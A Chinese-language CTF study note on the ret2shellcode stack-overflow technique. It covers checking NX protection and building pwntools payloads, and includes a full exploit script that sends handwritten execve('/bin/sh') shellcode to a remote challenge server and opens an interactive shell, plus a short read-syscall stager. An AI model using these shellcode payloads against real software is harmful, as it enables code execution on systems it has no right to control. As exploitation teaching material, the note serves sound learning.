`ret2shellcode` 是当我们程序中并没有我们的 system 函数的函数的时候，或者我们的 system 函数缺少一定的参数的时候，我们回去选择使用的一种方法。

我们想要实现一个 `ret2shellcode`,我们就需要下面的几个步骤：
第一步：确定我们的缺少内容，以及我们的程序保护
第二步：根据我们的程序保护确定我们要构造的内容和位置。
第三步：找到我们构造的 `shellcode` 的地址在哪里，然后我们再去调用调用我们的 `shellcode`


第一步：检查我们的栈保护
![[Pasted image 20240116145249.png]]

## 没有开启 NX 保护
### 思路
如果我们的程序没有开启我们的 NX 保护，那么我们可以考虑直接在我们的栈上写 shellcode 并且并且在栈上执行我们的 shellcode，

## 第一步：shellcode 构造 
这里，我们可以先考虑装在我们的 shellcode。这里，我们的 shellcode 在大部分情况下，可以通过我们的
```python
shellcode=asm(shelllcraft.sh())
```
来获得，在某些特殊情况（限制长度）下，我们才考虑去手动构造。

## 第二步：payload 构造
在这里，我们需要根据我们栈是否可以执行分为两类，如果我们的**栈上可以执行**，那么，我们直接就让我们的地址等于我们的栈的地址即可，
```cpp
payload=asm(shellcraft.sh()).ljust(112,b'A')
```
这个时候，我们构造的 `shellcode` 结构就应该如下所示：
1. Shellcode: 这一点我们可以通过我们 python 库库里的 `asm.(shellcraft.sh())` 来得到。
2. X 字节的垃圾数据，我们这里的所有是为了溢出到我们对应的 `return_address`。这里我们可以通过 python 中的中的 ljust 来确定
```python
payload=asm(shellcraft.sh()).ljust(112,b'A')
```
3. 4 字节的返回地址，这里我们的位置应该是我们的变量的初始地址，以做到执行我们的对应程序
```python
payload+=p32(buf2)
```

那么我们就可以把我们的地址设置为我们的 `buf2` 所在的地址。然后我们现把我们的 `shellcode` 写入到我们的 s，然后再找我们的 `buf2` 地址。

如果我们的**栈上不可执行**，那么我们需要修改的就是我们的输入输出方式和我们的 payload。需要我们具体问题具体分析，我们最后的 `p32` 的地址要自己去找 
```python
from pwn import *

context(os ='linux',arch = 'amd64',log_level = 'debug')

native = 0

  

if native :

    p = process('pwn1')

    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else :

    p = remote('node1.anna.nssctf.cn',28418)

    #libc = ELF('')

  

def debug():

    gdb.attach(p)

    pause()

def get_addr():

    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

se      = lambda data               :p.send(data)

sa      = lambda delim,data         :p.sendafter(delim, data)

sl      = lambda data               :p.sendline(data)

sla     = lambda delim,data         :p.sendlineafter(delim, data)

sea     = lambda delim,data         :p.sendafter(delim, data)

rc      = lambda numb=4096          :p.recv(numb)

rl      = lambda                    :p.recvline()

ru      = lambda delims             :p.recvuntil(delims)

name = 0x6010a0

shellcode =b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05';//手写shellcode

sa("Please.\n",shellcode)

payload = cyclic(0xa+8) + p64(name)

sla("start!",payload)

p.interactive()
```
## 要求 shellcode 短
第一步，观察我们的寄存器。
![[Pasted image 20240123173411.png]]
这里，我们的目标实把我们的 RDX 变成一个很大的值，这里，我们就可以通过我我们的 pop 指令来修改我们的 rdx 的值。

之后，我们就可以通过我们的异或操作，来吧我们的对应值都设置为我们的固定值。

```python
sc='push 0xfff;pop rdx;xor rax,rax;syscall'
```

通过上面的指令，我们就能够读一个 0xfff 大小的数据，并且把我们的数据存储在一个固定的位置，这个位置需要我们使用我们的 gdb 调试去检查。
![[Pasted image 20240123174807.png]]
之后，我们再去计算这个位置和我们的下一条可执行指令的区域想差是多少，然后再在对应位置构造一个 shellcode 即可。
![[Pasted image 20240123175117.png]]


![[Pasted image 20240123175133.png]]


```python
payload=a*0x23+asm(shellcraft.cat(./flag))
```

